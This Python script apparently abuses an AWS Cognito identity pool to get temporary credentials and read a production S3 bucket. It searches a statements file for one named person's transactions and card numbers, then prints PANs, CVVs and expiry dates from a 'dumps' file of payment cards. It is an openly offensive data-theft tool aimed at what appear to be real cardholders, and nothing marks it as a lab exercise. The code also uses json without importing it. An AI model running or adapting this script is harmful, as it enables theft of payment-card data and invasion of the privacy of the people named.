import boto3

# Get credentials
cognito = boto3.client('cognito-identity', region_name='us-east-1')
identity = cognito.get_id(IdentityPoolId='us-east-1:4867a4ae-a34b-4871-81e6-32174e227a6a')
creds = cognito.get_credentials_for_identity(IdentityId=identity['IdentityId'])
s3 = boto3.client('s3', region_name='sa-east-1', aws_access_key_id=creds['Credentials']['AccessKeyId'], aws_secret_access_key=creds['Credentials']['SecretKey'], aws_session_token=creds['Credentials']['SessionToken'])

# Check statements file for Julio Cesar
response = s3.get_object(Bucket='espressoapp-production', Key='statements/059e21d6-4441-489d-95ea-dcc7411808f9.csv')
content = response['Body'].read().decode('utf-8', errors='ignore')
lines = content.split('\n')

print('[*] Searching for Julio Cesar Ferreira transactions...')
print()
for line in lines:
    if 'Julio' in line or 'Cesar' in line or 'Ferreira' in line:
        parts = line.split(';')
        name = parts[2].replace('"', '')
        card = parts[3].replace('"', '')
        value = parts[4]
        transaction_type = parts[7] if len(parts) > 7 else 'N/A'
        print('[FOUND] Name: ' + name)
        print('  Card: ' + card)
        print('  Value: ' + value)
        print('  Type: ' + transaction_type)
        print()

# Also check the CARTOES_ANALISE_FINAL.json for full card data
print('[*] Checking CARTOES_ANALISE_FINAL.json for card details...')
try:
    response2 = s3.get_object(Bucket='espressoapp-production', Key='dumps/CARTOES_ANALISE_FINAL.json')
    content2 = response2['Body'].read().decode('utf-8', errors='ignore')
    data = json.loads(content2)
    print('[+] Found ' + str(len(data.get('cartoes_2024', []))) + ' cards in 2024')
    # Show first few cards
    for card in data.get('cartoes_2024', [])[:5]:
        print('  - PAN: ' + str(card.get('pan', 'N/A')))
        print('    CVV: ' + str(card.get('cvv', 'N/A')))
        print('    Exp: ' + str(card.get('exp', 'N/A')))
except Exception as e:
    print('[-] Error: ' + str(e))